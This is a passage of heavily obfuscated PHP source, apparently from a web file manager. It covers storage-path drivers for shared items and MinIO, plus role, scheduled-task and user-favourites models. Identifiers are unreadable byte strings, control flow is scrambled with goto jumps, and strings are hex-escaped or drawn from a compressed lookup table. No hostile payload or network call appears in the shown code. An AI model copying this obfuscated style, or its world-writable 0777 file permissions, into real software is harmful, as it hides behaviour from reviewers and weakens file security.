($dğ·˜ˆñÆˆ) { if (@is_file($Fëƒ·ÙÔ³)) { return !0; } } else { if (@is_dir($Fëƒ·ÙÔ³ . $DëÌ‡“œÕµ[8])) { return !0; } } } closedir($dÆŞÅ  ¤É); goto cïÇ£ùˆ¶Ğ; C¦ÌĞ‚èˆô: if (!($dÆŞÅ  ¤É = @opendir($EêŞç‹›Å))) { return !1; } $Fè“×³È÷ = 0; $cà™ÁŠšì‡ = 0; goto BãïòĞÖê¹; fÛ”ÀÜçŞ¢: $DëÌ‡“œÕµ =& $_SERVER[´¬]; $EêŞç‹›Å = $this->iconvSystem($EêŞç‹›Å); $EêŞç‹›Å = rtrim($EêŞç‹›Å, $DëÌ‡“œÕµ[8]) . $DëÌ‡“œÕµ[8]; goto C¦ÌĞ‚èˆô; a­‚Ä“à: } public function hashSimple($Dåø·†˜¦—) { goto Eó·°ÚŞã¶; aè„îÊê˜ö: $fäš°ÃÂº = $this->size($Dåø·†˜¦—); $A¡Š‚ä¢‰ê = 200; $aï¨¶½ôÏï = 50; goto fŒˆÏ¬ÒÂ—; AÏŞØËğÂæ: fseek_64($f‰ö”Î‰¨Ÿ, $fäš°ÃÂº - $A¡Š‚ä¢‰ê); $FƒÉÅ‡öÇ¶ .= fread($f‰ö”Î‰¨Ÿ, $A¡Š‚ä¢‰ê); fclose($f‰ö”Î‰¨Ÿ); goto D›—¸Ã„ó…; Eó·°ÚŞã¶: $DŒåØÁé—ø =& $_SERVER[´¬]; if (!$Dåø·†˜¦—) { return md5($DŒåØÁé—ø[33]); } $Dåø·†˜¦— = $this->iconvSystem($Dåø·†˜¦—); goto aè„îÊê˜ö; fŒˆÏ¬ÒÂ—: if ($fäš°ÃÂº <= $A¡Š‚ä¢‰ê * $aï¨¶½ôÏï) { return $this->hashMd5($Dåø·†˜¦—) . $fäš°ÃÂº; } $FƒÉÅ‡öÇ¶ = $DŒåØÁé—ø[33]; $aÒŠåÍÇÌ = intval($fäš°ÃÂº / $aï¨¶½ôÏï); goto fæ™­Ï†…ç; fæ™­Ï†…ç: $f‰ö”Î‰¨Ÿ = fopen($Dåø·†˜¦—, $DŒåØÁé—ø[1259]); if (!$f‰ö”Î‰¨Ÿ) { return $FƒÉÅ‡öÇ¶; } for ($aÀÛå‚çĞÆ = 0; $aÀÛå‚çĞÆ < $aï¨¶½ôÏï; $aÀÛå‚çĞÆ++) { fseek_64($f‰ö”Î‰¨Ÿ, $aÒŠåÍÇÌ * $aÀÛå‚çĞÆ); $FƒÉÅ‡öÇ¶ .= fread($f‰ö”Î‰¨Ÿ, $A¡Š‚ä¢‰ê); } goto AÏŞØËğÂæ; D›—¸Ã„ó…: return md5($FƒÉÅ‡öÇ¶) . $fäš°ÃÂº; goto bÁ×‹ã¹Ìø; bÁ×‹ã¹Ìø: } public function getContent($eíÚŠ‹˜íŒ) { $eíÚŠ‹˜íŒ = $this->iconvSystem($eíÚŠ‹˜íŒ); return file_get_contents($eíÚŠ‹˜íŒ); } public function setContent($E¥™ïÑ¢‹å, $déˆøÓğÀñ = '') { $E¥™ïÑ¢‹å = $this->iconvSystem($E¥™ïÑ¢‹å); $e¦ò«Š×¨ø = @file_put_contents($E¥™ïÑ¢‹å, $déˆøÓğÀñ, LOCK_EX); clearstatcache(); @chmod($E¥™ïÑ¢‹å, 511); return $e¦ò«Š×¨ø === !1 ? !1 : !0; } public function fileSubstr($D£Ÿ£‰àè, $C›Ğ§ÇÛ• = 0, $b™šáÖ«Š = false) { goto a—Á¦«ë; eÑÈÙèÙšŸ: if ($b™šáÖ«Š <= 0) { return $añĞâãàê§[33]; } $Dã…­Ä¦Ñ = fopen($D£Ÿ£‰àè, $añĞâãàê§[1259]); if (!$Dã…­Ä¦Ñ) { return !1; } goto D°à¨§ìÂó; D°à¨§ìÂó: fseek_64($Dã…­Ä¦Ñ, $C›Ğ§ÇÛ•); $eƒ’«Ş½‰Ñ = fread($Dã…­Ä¦Ñ, $b™šáÖ«Š); fclose($Dã…­Ä¦Ñ); goto F´£±äø¨; F´£±äø¨: return $eƒ’«Ş½‰Ñ; goto B®›ˆŠÖã‡; a—Á¦«ë: $añĞâãàê§ =& $_SERVER[´¬]; $D£Ÿ£‰àè = $this->iconvSystem($D£Ÿ£‰àè); if ($b™šáÖ«Š === !1) { $b™šáÖ«Š = $this->size($D£Ÿ£‰àè); } goto eÑÈÙèÙšŸ; B®›ˆŠÖã‡: } public function upload($BŞåõ¿Ôª­, $aÛƒ›»ñ, $fåº‘¨›ç = false, $A‰”×Ó¥‚ª = REPEAT_REPLACE) { if ($fåº‘¨›ç) { return $this->moveFile($aÛƒ›»ñ, $BŞåõ¿Ôª­); } return $this->copyFile($aÛƒ›»ñ, $BŞåõ¿Ôª­); } public function setModifyTime($FÛâ…ø°, $Dåôäëæ¢† = '') { @touch($FÛâ…ø°, intval($Dåôäëæ¢†)); } public function download($d§­·×òÓˆ, $f‡õŸñ˜¯Ê) { return $this->iconvSystem($d§­·×òÓˆ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($aÛÈ›æÉø÷) { parent::__construct($aÛÈ›æÉø÷); $this->signatureVersion($_SERVER[´¬][211]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto b‹Êé¡äÁ; c¦Å÷ƒ¿Ø: define($_SERVER[´¬][0], $_SERVER[´¬][1]); $_SERVER[Ì] = explode($_SERVER[´¬][2], gzinflate(substr($_SERVER[´¬][3], 10, -8))); function binCheckEq($aò°êù êí, $CÊÙ¹åİ•) { return $aò°êù êí == $CÊÙ¹åİ•; } goto BùÂÛïÜİ¹; eÀ¼éÓ¸À½: class PathDriverDbShareItem extends PathDriverDB { public function __construct($fÎÓ¹Ÿ»…) { $this->pathParse = $fÎÓ¹Ÿ»…; $this->model = Model($_SERVER[´¬][1206]); } public function getPathOuter($F×İÉ˜•‹¬) { $Aîë¯÷ÇÄæ =& $_SERVER[´¬]; if (!$F×İÉ˜•‹¬) { return $F×İÉ˜•‹¬; } $d³´¢£ùİ = $this->parse($F×İÉ˜•‹¬); return trim(KodIO::makeShare($this->pathParse[$Aîë¯÷ÇÄæ[392]], $d³´¢£ùİ[$Aîë¯÷ÇÄæ[392]]), $Aîë¯÷ÇÄæ[8]); } protected function infoParse($bÃ„ù¬í©ƒ, $c“•Ö˜·¼À = false, $Bæ›ºÂ§ = false) { $bÆÖóÉ’ä¯ =& $_SERVER[´¬]; $BÏ†Ù‰…á“ = $this->pathParse[$bÆÖóÉ’ä¯[392]]; $f¯…Ø«Ğ’Õ = trim($this->pathParse[$bÆÖóÉ’ä¯[1065]], $bÆÖóÉ’ä¯[8]); return Action($bÆÖóÉ’ä¯[1214])->sharePathInfo($BÏ†Ù‰…á“, $f¯…Ø«Ğ’Õ); } public function infoFull($BÏ‡À½ÓĞ…) { $A„…ÛßÄ¡¬ =& $_SERVER[´¬]; $c¹å‡íÉŠ… = explode($A„…ÛßÄ¡¬[8], trim($BÏ‡À½ÓĞ…, $A„…ÛßÄ¡¬[8])); if (count($c¹å‡íÉŠ…) > 1) { $f„Œ‰Õ¼ = implode($A„…ÛßÄ¡¬[8], array_splice($c¹å‡íÉŠ…, 1)); $f²«²Ò‰ = $this->model->pathInfoByPath($c¹å‡íÉŠ…[0], $f„Œ‰Õ¼); if (!$f²«²Ò‰) { return !1; } $this->pathParse[$A„…ÛßÄ¡¬[1065]] = $f²«²Ò‰[$A„…ÛßÄ¡¬[394]]; } return $this->infoParse($BÏ‡À½ÓĞ…); } public function listAll($f‡œãçÄ†¬) { goto f‘®­‚ÜÑ™; f‘®­‚ÜÑ™: $BÇƒäñ£‰® =& $_SERVER[´¬]; $aÆñí©†’× = IO::info($this->pathParse[$BÇƒäñ£‰®[76]]); if (!$aÆñí©†’×) { return array(); } goto DåêÛÍ¾Ó; Aöµ ‘ôÙ¦: foreach ($D¯°íŒ†Ì as &$Eå‹ÉÀÁÅÓ) { check_abort(); $Eå‹ÉÀÁÅÓ[$BÇƒäñ£‰®[85]] = $AìŸÆ¶óÄ³->_shareItemeParse($Eå‹ÉÀÁÅÓ[$BÇƒäñ£‰®[85]], $C¨š©Â¦»Û); } unset($Eå‹ÉÀÁÅÓ); return $D¯°íŒ†Ì; goto C»›”î‘‡‡; DåêÛÍ¾Ó: $D¯°íŒ†Ì = $this->model->listAll($f‡œãçÄ†¬); $C¨š©Â¦»Û = Model($BÇƒäñ£‰®[562])->getInfo($aÆñí©†’×[$BÇƒäñ£‰®[466]]); $AìŸÆ¶óÄ³ = Action($BÇƒäñ£‰®[1214]); goto Aöµ ‘ôÙ¦; C»›”î‘‡‡: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($FÍÑòè¬“é) { $this->pathParse = $FÍÑòè¬“é; $this->model = Model($_SERVER[´¬][1206]); } protected function infoParse($e‚ÏëÎ¨ƒ, $Bƒ¸§¯Ø“Œ = false, $AÎğ—™õ‹ = false) { $aßàù‰“ññ =& $_SERVER[´¬]; return Action($aßàù‰“ññ[1071])->sharePathInfo($this->pathParse[$aßàù‰“ññ[76]], !0); } public function listPath($e«ÆŸÜÓí, $D£í•‘¥ = false) { $a„¯Ä”ÙìĞ =& $_SERVER[´¬]; $FÀ©ÚÜİÃ“ = parent::listPath($e«ÆŸÜÓí, $D£í•‘¥); foreach ($FÀ©ÚÜİÃ“ as $f¦©Û§¤ÇŒ => $a¡÷‘¯ÈƒÈ) { if (!in_array($f¦©Û§¤ÇŒ, array($a„¯Ä”ÙìĞ[74], $a„¯Ä”ÙìĞ[75]))) { continue; } foreach ($a¡÷‘¯ÈƒÈ as $dÄ®Ñ‹•Çõ => $eµÈ“òß‰ ) { $FÀ©ÚÜİÃ“[$f¦©Û§¤ÇŒ][$dÄ®Ñ‹•Çõ] = Action($a„¯Ä”ÙìĞ[1071])->shareItemInfo($eµÈ“òß‰ ); } } return $FÀ©ÚÜİÃ“; } public function listAll($d£¿õÔè¾Œ) { goto Eà¶è´©†; BÌÜº†‚â: $CßùšÚ°µ = $this->model->listAll($d£¿õÔè¾Œ); foreach ($CßùšÚ°µ as &$aç¬Éµ•™) { $aç¬Éµ•™[$Dğãª–±ƒ [85]] = Action($Dğãª–±ƒ [1071])->shareItemInfo($aç¬Éµ•™[$Dğãª–±ƒ [85]]); } unset($aç¬Éµ•™); goto f¤ç°„ñáĞ; Eà¶è´©†: $Dğãª–±ƒ  =& $_SERVER[´¬]; $eñ»ñµ¤»ò = IO::info($this->pathParse[$Dğãª–±ƒ [76]]); if (!$eñ»ñµ¤»ò) { return array(); } goto BÌÜº†‚â; f¤ç°„ñáĞ: return $CßùšÚ°µ; goto cÉéŠÉñ¹½; cÉéŠÉñ¹½: } } class PathDriverDriverShareItem { public function __construct($CÊÜŠ‡±†) { $this->pathParse = $CÊÜŠ‡±†; } public function __call($a ŞÜ‡£ÌÔ, $E‹š”ÚŸ÷) { $fâ¯ÊŠØ˜ =& $_SERVER[´¬]; if (method_exists($this, $a ŞÜ‡£ÌÔ)) { return; } $fÁé™ˆ›æ² = call_user_func_array(array($fâ¯ÊŠØ˜[1215], $a ŞÜ‡£ÌÔ), $E‹š”ÚŸ÷); $Eñó³ğÔ = array($fâ¯ÊŠØ˜[1216], $fâ¯ÊŠØ˜[1217], $fâ¯ÊŠØ˜[1218], $fâ¯ÊŠØ˜[1219], $fâ¯ÊŠØ˜[517], $fâ¯ÊŠØ˜[519], $fâ¯ÊŠØ˜[1220], $fâ¯ÊŠØ˜[107], $fâ¯ÊŠØ˜[1221], $fâ¯ÊŠØ˜[1222]); if (in_array($a ŞÜ‡£ÌÔ, $Eñó³ğÔ)) { $fÁé™ˆ›æ² = $this->getPathOuter($fÁé™ˆ›æ²); } return $fÁé™ˆ›æ²; } public function copy($eÉ…ĞèäŸŒ, $DçÄ¨„ãÁ, $aßÚ Øˆ¥à = false) { return $this->copyMove($eÉ…ĞèäŸŒ, $DçÄ¨„ãÁ, $aßÚ Øˆ¥à, $_SERVER[´¬][517]); } public function move($c¥Õ¼ˆÁ‹î, $e›ç‚ßÜ, $Fç²©ùÆ„Ä = false) { return $this->copyMove($c¥Õ¼ˆÁ‹î, $e›ç‚ßÜ, $Fç²©ùÆ„Ä, $_SERVER[´¬][519]); } private function copyMove($f†ŒàŸ•Ê™, $DïÅÆóäãÇ, $dµß·²Ôª», $dÍ•èÁ÷¨î) { goto EîêåÌ÷Â; aíˆÓÎ¼¸: return $d˜ÀÌÖ§Ø; goto dŒ†Õ«É¯È; EîêåÌ÷Â: $Dà…Ë£Òò =& $_SERVER[´¬]; $b›°‚ ¿ = $DïÅÆóäãÇ; $EÄó®£–“ = IO::driverMake($DïÅÆóäãÇ); goto Dæ«…¹›Ñ®; Dæ«…¹›Ñ®: if ($EÄó®£–“->pathParse[$Dà…Ë£Òò[1049]]) { $DïÅÆóäãÇ = $EÄó®£–“->pathParse[$Dà…Ë£Òò[1049]]; } else { $DïÅÆóäãÇ = $b›°‚ ¿; } $d˜ÀÌÖ§Ø = IO::copyMove($f†ŒàŸ•Ê™, $DïÅÆóäãÇ, $dµß·²Ôª», $dÍ•èÁ÷¨î); $d˜ÀÌÖ§Ø = $this->getPathOuter($d˜ÀÌÖ§Ø); goto aíˆÓÎ¼¸; dŒ†Õ«É¯È: } public function pathThis($FÀİĞÆ¿) { return get_path_this($this->pathParse[$_SERVER[´¬][76]]); } public function pathFather($DÁßŒ·«Šš) { return get_path_father($this->pathParse[$_SERVER[´¬][76]]); } public function iconvSystem($aóªø¿‚Ü) { return $aóªø¿‚Ü; } protected function infoParse($B­œ¡»†¸â, $b‰˜­Ì¦…¥ = false) { $A°òÙŒèğ =& $_SERVER[´¬]; $aÉÚ§¸£Ğ = $this->pathParse[$A°òÙŒèğ[464]][$A°òÙŒèğ[1072]] . $this->pathParse[$A°òÙŒèğ[1065]]; if ($b‰˜­Ì¦…¥) { $cİîÁšÒâ“ = IO::infoWithChildren($aÉÚ§¸£Ğ); } else { $cİîÁšÒâ“ = IO::info($aÉÚ§¸£Ğ); } $E‚ŞÃœ°á = $this->pathParse[$A°òÙŒèğ[464]]; return Action($A°òÙŒèğ[1214])->_shareItemeParse($cİîÁšÒâ“, $E‚ŞÃœ°á); } public function listAll($CœÀßª¥¾£) { $cö§ã›İˆî =& $_SERVER[´¬]; $fÙöŠã¼¢¨ = IO::listAll($CœÀßª¥¾£); $F‰¾‹Ã‡Ì´ = $this->pathParse[$cö§ã›İˆî[464]]; foreach ($fÙöŠã¼¢¨ as &$F¯‡Ü®§¥¤) { check_abort(); $D¿½‹Şùºß = IO::info($F¯‡Ü®§¥¤[$cö§ã›İˆî[76]]); $D¿½‹Şùºß = is_array($D¿½‹Şùºß) ? $D¿½‹Şùºß : array(); $F¯‡Ü®§¥¤ = array_merge($D¿½‹Şùºß, $F¯‡Ü®§¥¤); $F¯‡Ü®§¥¤[$cö§ã›İˆî[85]] = Action($cö§ã›İˆî[1214])->_shareItemeParse($F¯‡Ü®§¥¤, $F‰¾‹Ã‡Ì´); } unset($F¯‡Ü®§¥¤); return $fÙöŠã¼¢¨; } public function getPathOuter($có©¶‚‹¦) { goto aµæ”Í„Œµ; aµæ”Í„Œµ: $aÖ—ÖêÙâ² =& $_SERVER[´¬]; $a²Ãí‰”˜Ã = KodIO::parse($có©¶‚‹¦); if ($a²Ãí‰”˜Ã[$aÖ—ÖêÙâ²[29]] == KodIO::KOD_SHARE_ITEM) { return $a²Ãí‰”˜Ã[$aÖ—ÖêÙâ²[76]]; } goto bÕÙòĞÚÕ; e‹ô›·ÖÔá: if (substr($eÁÎäš¥Ì¨, 0, strlen($dæ³ˆ¾î¶)) != $dæ³ˆ¾î¶) { return !1; } return $this->pathParse[$aÖ—ÖêÙâ²[1066]] . $aÖ—ÖêÙâ²[8] . ltrim($E¢¹ò“İÖã, $aÖ—ÖêÙâ²[8]); goto fƒ¦ª©¤Š˜; bÕÙòĞÚÕ: $eÁÎäš¥Ì¨ = KodIO::clear($có©¶‚‹¦); $dæ³ˆ¾î¶ = KodIO::clear($this->pathParse[$aÖ—ÖêÙâ²[464]][$aÖ—ÖêÙâ²[1072]]); $E¢¹ò“İÖã = substr($eÁÎäš¥Ì¨, strlen($dæ³ˆ¾î¶)); goto e‹ô›·ÖÔá; fƒ¦ª©¤Š˜: } public function getType() { $C¨„ÚĞ×Î– =& $_SERVER[´¬]; $C–’´óÒ = str_replace($C¨„ÚĞ×Î–[72], $C¨„ÚĞ×Î–[33], get_class($this)); return strtolower($C–’´óÒ); } public function isTypeObject($C“õÖ¸å¦™) { return IO::isTypeObject($C“õÖ¸å¦™); } public function info($e‚ïÁ‡¾È») { return $this->infoParse($e‚ïÁ‡¾È»); } public function infoAuth($BˆªãİÍ¢) { return $this->infoParse($BˆªãİÍ¢); } public function infoWithChildren($CµŞ´Æ‰í) { return $this->infoParse($CµŞ´Æ‰í, !0); } public function infoFull($d¹Ù‰‡™ù) { return $this->infoParse($d¹Ù‰‡™ù); } } goto A £ìñÇˆ¦; fã‡Öˆ”: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\x2e\162\x6f\154\x65\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\141\165\x74\150", "\154\x61\x62\145\154", "\144\151\163\x70\x6c\141\x79", "\163\171\x73\x74\145\155", "\x64\145\163\x63", "\151\147\156\x6f\162\145\105\170\164", "\x69\x67\x6e\157\x72\145\106\151\154\x65\123\151\x7a\145", "\x61\x64\x6d\151\x6e\151\163\164\162\x61\x74\x6f\162", "\163\x6f\162\164"); public function listData($e»ÍéŞ = false, $eÉ¦ÁÅ ‘ = "\163\x6f\x72\164", $Eåƒå‡ê¡ = false) { $C—Ù¿¹Û· =& $_SERVER[´¬]; $A£´•¤í´· = parent::listData($e»ÍéŞ, $eÉ¦ÁÅ ‘, $Eåƒå‡ê¡); if (!$e»ÍéŞ) { foreach ($A£´•¤í´· as $bˆŸ…œ£è => $Dó™£¿†Éç) { if ($Dó™£¿†Éç[$C—Ù¿¹Û·[1878]] == 1) { $A£´•¤í´·[$bˆŸ…œ£è][$C—Ù¿¹Û·[429]] = LNG($C—Ù¿¹Û·[2102]); } } } return $A£´•¤í´·; } public function update($C¼î ÏåÏè, $f‹ÊÕó¨åÚ) { goto B»¿Ø¹ŸŒô; cÇ¦³‘‹¼œ: return parent::update($C¼î ÏåÏè, $f‹ÊÕó¨åÚ); goto DĞù‚‰Ö×„; B»¿Ø¹ŸŒô: $D‡·’öÔ¿ =& $_SERVER[´¬]; $eµ†Ğà¨¨ = parent::listData($C¼î ÏåÏè); $eğ° ª½İÆ = $this->findByName($f‹ÊÕó¨åÚ[$D‡·’öÔ¿[28]]); goto FöÓá—“™‘; FöÓá—“™‘: if (!$eµ†Ğà¨¨ || $eğ° ª½İÆ && $eğ° ª½İÆ[$D‡·’öÔ¿[392]] != $eµ†Ğà¨¨[$D‡·’öÔ¿[392]]) { return !1; } if ($eğ° ª½İÆ[$D‡·’öÔ¿[1878]] == 1) { $f‹ÊÕó¨åÚ = array($D‡·’öÔ¿[28] => $f‹ÊÕó¨åÚ[$D‡·’öÔ¿[28]], $D‡·’öÔ¿[1710] => $f‹ÊÕó¨åÚ[$D‡·’öÔ¿[1710]]); } $this->filterAuth($f‹ÊÕó¨åÚ[$D‡·’öÔ¿[404]]); goto cÇ¦³‘‹¼œ; DĞù‚‰Ö×„: } public function remove($F”ñ—½¯øŞ) { $aßÏŞ²÷²‘ = parent::listData($F”ñ—½¯øŞ); if (!$aßÏŞ²÷²‘ || $aßÏŞ²÷²‘[$_SERVER[´¬][1171]]) { return !1; } return parent::remove($F”ñ—½¯øŞ); } public function add($Bğñ†Ûõà) { goto dÆâè›‹ªİ; Fˆ´˜·: return parent::insert($Bğñ†Ûõà); goto c¸ÑÜ«ø§º; dÓ¤‘œ­¼Ğ: $B˜¡£²…É = array($aÔˆ¸¢ä­[411] => $a¼Ğœ×ÎŠ, $aÔˆ¸¢ä­[1695] => $aÔˆ¸¢ä­[33], $aÔˆ¸¢ä­[1691] => $aÔˆ¸¢ä­[1699], $aÔˆ¸¢ä­[2103] => 1, $aÔˆ¸¢ä­[1694] => 0, $aÔˆ¸¢ä­[2104] => 0, $aÔˆ¸¢ä­[1693] => $this->getSort()); $Bğñ†Ûõà = array_merge($B˜¡£²…É, $Bğñ†Ûõà); $this->filterAuth($Bğñ†Ûõà[$aÔˆ¸¢ä­[404]]); goto Fˆ´˜·; dÆâè›‹ªİ: $aÔˆ¸¢ä­ =& $_SERVER[´¬]; $a¼Ğœ×ÎŠ = $Bğñ†Ûõà[$aÔˆ¸¢ä­[28]]; if ($this->findByName($a¼Ğœ×ÎŠ)) { return !1; } goto dÓ¤‘œ­¼Ğ; c¸ÑÜ«ø§º: } private function getSort() { $DŸĞØÂ¡ =& $_SERVER[´¬]; $c™ùÎ«™íö = parent::listData(); $eõ†Í¶­ˆ… = array_to_keyvalue($c™ùÎ«™íö, $DŸĞØÂ¡[33], $DŸĞØÂ¡[1712]); return empty($eõ†Í¶­ˆ…) ? 0 : max($eõ†Í¶­ˆ…) + 1; } private function filterAuth(&$d÷Æù·‘ß) { $cÚÄâæÔŸŞ =& $_SERVER[´¬]; $bƒ¼š³ğÈ¹ = array(); $cò›Úô÷šä = array_filter(explode($cÚÄâæÔŸŞ[47], $d÷Æù·‘ß)); foreach ($cò›Úô÷šä as $d÷Æù·‘ß) { $BæÓÁ¸¿ãï = explode($cÚÄâæÔŸŞ[95], $d÷Æù·‘ß); if ($BæÓÁ¸¿ãï[0] == $cÚÄâæÔŸŞ[2105] && $BæÓÁ¸¿ãï[1] != $cÚÄâæÔŸŞ[1091]) { $aÓéí„Ø = $BæÓÁ¸¿ãï[0] . $cÚÄâæÔŸŞ[95] . $BæÓÁ¸¿ãï[1] . $cÚÄâæÔŸŞ[2106]; if (!in_array($aÓéí„Ø, $cò›Úô÷šä)) { $bƒ¼š³ğÈ¹[] = $aÓéí„Ø; } } $bƒ¼š³ğÈ¹[] = $d÷Æù·‘ß; } $d÷Æù·‘ß = implode($cÚÄâæÔŸŞ[47], $bƒ¼š³ğÈ¹); } public function sort($b¬ÉÄŞÜ”´, $A›ÜÇ³³ƒ®) { return parent::update($b¬ÉÄŞÜ”´, $A›ÜÇ³³ƒ®); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\x6d\56\x74\141\163\x6b\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\x74\x79\x70\x65", "\x65\166\145\x6e\164", "\164\x69\x6d\145", "\144\x65\163\143", "\163\171\x73\164\x65\155", "\x65\156\141\x62\x6c\145", "\154\x61\163\x74\122\165\x6e", "\x73\x6f\x72\164"); public function listData($E‹Ì¿¯Ú×ê = false, $Dô³§Â¿´Ù = "\163\157\x72\x74", $aÜÈÒ†ïŒ‚ = false) { return parent::listData($E‹Ì¿¯Ú×ê, $Dô³§Â¿´Ù, $aÜÈÒ†ïŒ‚); } public function add($AÉÍ‡†Â„Ô) { $aì‚ƒ©·ÌÌ =& $_SERVER[´¬]; $cèÇŸ›í’ = $this->findByName($AÉÍ‡†Â„Ô[$aì‚ƒ©·ÌÌ[28]]); if ($cèÇŸ›í’) { return !1; } $AÉÍ‡†Â„Ô[$aì‚ƒ©·ÌÌ[1491]] = 0; $AÉÍ‡†Â„Ô[$aì‚ƒ©·ÌÌ[1712]] = $this->getSort(); return parent::insert($AÉÍ‡†Â„Ô); } private function getSort() { $Cß‘èÔ³½¤ =& $_SERVER[´¬]; $CøËÊ¾© = parent::listData(); $A³æÂŠ¼Œç = array_to_keyvalue($CøËÊ¾©, $Cß‘èÔ³½¤[33], $Cß‘èÔ³½¤[1712]); return empty($A³æÂŠ¼Œç) ? 0 : max($A³æÂŠ¼Œç) + 1; } public function update($a©˜åÄğĞ , $b…‘ÛŞÈ–Ğ) { $e”ë‚¼õ¬‚ =& $_SERVER[´¬]; $b¤ÖÏŞŒ³ = $this->listData($a©˜åÄğĞ ); $D–ÉßĞ†‘£ = $this->findByName($b…‘ÛŞÈ–Ğ[$e”ë‚¼õ¬‚[28]]); if (!$b¤ÖÏŞŒ³ || $D–ÉßĞ†‘£ && $D–ÉßĞ†‘£[$e”ë‚¼õ¬‚[392]] != $b¤ÖÏŞŒ³[$e”ë‚¼õ¬‚[392]]) { return !1; } return parent::update($a©˜åÄğĞ , $b…‘ÛŞÈ–Ğ); } public function remove($d§ÛóçÊÌ», $FËİ³‡Üö§ = false) { $CáŠ¼¸«‚¨ =& $_SERVER[´¬]; $fÆºÑ“¶‹ã = $this->listData($d§ÛóçÊÌ»); if (!$fÆºÑ“¶‹ã) { return; } if (!$FËİ³‡Üö§ && $fÆºÑ“¶‹ã[$CáŠ¼¸«‚¨[1171]] == $CáŠ¼¸«‚¨[87]) { return !1; } return parent::remove($d§ÛóçÊÌ»); } public function enable($DÒï„«÷Ò, $CìñÑ¾ˆÚĞ) { return $this->update($DÒï„«÷Ò, array($_SERVER[´¬][2097] => $CìñÑ¾ˆÚĞ)); } public function run($f…‹—“ˆÓ†) { return $this->update($f…‹—“ˆÓ†, array($_SERVER[´¬][2107] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($dÍ‡ìÙ–Øæ) { $Eó‹Ô”·•› =& $_SERVER[´¬]; return array($Eó‹Ô”·•›[1791] => array(USER_ID, $Eó‹Ô”·•›[2108])); } protected function listData() { $A¦¹„é˜‘ =& $_SERVER[´¬]; $aŒ‰”¬¾± = array($A¦¹„é˜‘[1518] => USER_ID, $A¦¹„é˜‘[461] => 0); $aä‹–¿™Ï¼ = $A¦¹„é˜‘[2109]; $f¬±÷ò¶ª = $this->field($aä‹–¿™Ï¼)->where($aŒ‰”¬¾±)->order($A¦¹„é˜‘[2110])->select(); return $f¬±÷ò¶ª ? $f¬±÷ò¶ª : array(); } protected function resetCache() { } protected function listView() { goto bŠÊİ·ÜŠ¶; bŠÊİ·ÜŠ¶: $aà³¼èÆ™ =& $_SERVER[´¬]; $C‚ß¯ÇÁ‹ = $this->listData(); $cÌ¥Ïšîä = array_filter_by_field($C‚ß¯ÇÁ‹, $aà³¼èÆ™[29], $aà³¼èÆ™[407]); goto FÏ©Ü³­À; BøğÊâ³ï: $DÊï´Ôå¿ = array($aà³¼èÆ™[408] => array($aà³¼èÆ™[409], $DÜ¢‹ïĞˆª)); $B•¹«ÔÓŒˆ = Model($aà³¼èÆ™[790])->listSource($DÊï´Ôå¿, $Aôº‘ÁÄŠ); $B•¹«ÔÓŒˆ = array_merge($B•¹«ÔÓŒˆ[$aà³¼èÆ™[74]], $B•¹«ÔÓŒˆ[$aà³¼èÆ™[75]]); goto bÚ¬Åá‰Ç„; bÚ¬Åá‰Ç„: $B•¹«ÔÓŒˆ = array_to_keyvalue($B•¹«ÔÓŒˆ, $aà³¼èÆ™[394]); foreach ($C‚ß¯ÇÁ‹ as $cŒõÔšâÛ => $c‘ÛßãÊè) { $Bª°âØ””‡ = $B•¹«ÔÓŒˆ[$c‘ÛßãÊè[$aà³¼èÆ™[76]]]; $Bª°âØ””‡ = $Bª°âØ””‡ ? $Bª°âØ””‡ : array(); $C‚ß¯ÇÁ‹[$cŒõÔšâÛ] = array_merge($Bª°âØ””‡, $c‘ÛßãÊè); } return $C‚ß¯ÇÁ‹; goto CÃ”¤êÀÊÍ; FÏ©Ü³­À: $DÜ¢‹ïĞˆª = array_to_keyvalue($cÌ¥Ïšîä, $aà³¼èÆ™[33], $aà³¼èÆ™[76]); if (!$DÜ¢‹ïĞˆª) { return $C‚ß¯ÇÁ‹; } $Aôº‘ÁÄŠ = 2000; goto BøğÊâ³ï; CÃ”¤êÀÊÍ: } protected function addFav($e¾¨³¶åê, $Fø¬ˆøÉÊ = '', $e•ÖÔ¿˜Çù = "\x73\157\165\x72\x63\x65") { goto cç†®†â; cç†®†â: $cÒ±Ó–ç  =& $_SERVER[´¬]; $F Çš´ù½ = array($cÒ±Ó–ç [1518] => USER_ID, $cÒ±Ó–ç [461] => 0, $cÒ±Ó–ç [413] => $e•ÖÔ¿˜Çù, $cÒ±Ó–ç [412] => $e¾¨³¶åê); if ($this->where($F Çš´ù½)->find()) { return !1; } goto D×ôˆ­Õª‰; D×ôˆ­Õª‰: $F Çš´ù½ = array($cÒ±Ó–ç [1518] => USER_ID, $cÒ±Ó–ç [461] => 0); $DÁÃæí±ƒî = $this->where($F Çš´ù½)->max($cÒ±Ó–ç [1712]); if (!$DÁÃæí±ƒî) { $DÁÃæí±ƒî = 0; } goto b±´½ÏÍˆÅ; b±´½ÏÍˆÅ: if (!$Fø¬ˆøÉÊ && $e•ÖÔ¿˜Çù == $cÒ±Ó–ç [407]) { $CˆéŠ¡Œ¬í = Model($cÒ±Ó–ç [1206])->where(array($cÒ±Ó–ç [408] => $e¾¨³¶åê))->find(); if (!$CˆéŠ¡Œ¬í) { return !1; } $Fø¬ˆøÉÊ = $CˆéŠ¡Œ¬í[$cÒ±Ó–ç [28]]; } $Fø¬ˆøÉÊ = $this->getAutoName($Fø¬ˆøÉÊ); $Dâ¤¥ÆĞ¨Ğ = array($cÒ±Ó–ç [1518] => USER_ID, $cÒ±Ó–ç [461] => 0, $cÒ±Ó–ç [411] => $Fø¬ˆøÉÊ, $cÒ±Ó–ç [412] => $e¾¨³¶åê, $cÒ±Ó–ç [413] => $e•ÖÔ¿˜Çù, $cÒ±Ó–ç [1693] => $DÁÃæí±ƒî + 1); goto bÍÎ©ãİ¯; bÍÎ©ãİ¯: return $this->add($Dâ¤¥ÆĞ¨Ğ); goto CÎ›×ß¬Çö; CÎ›×ß¬Çö: } protected function 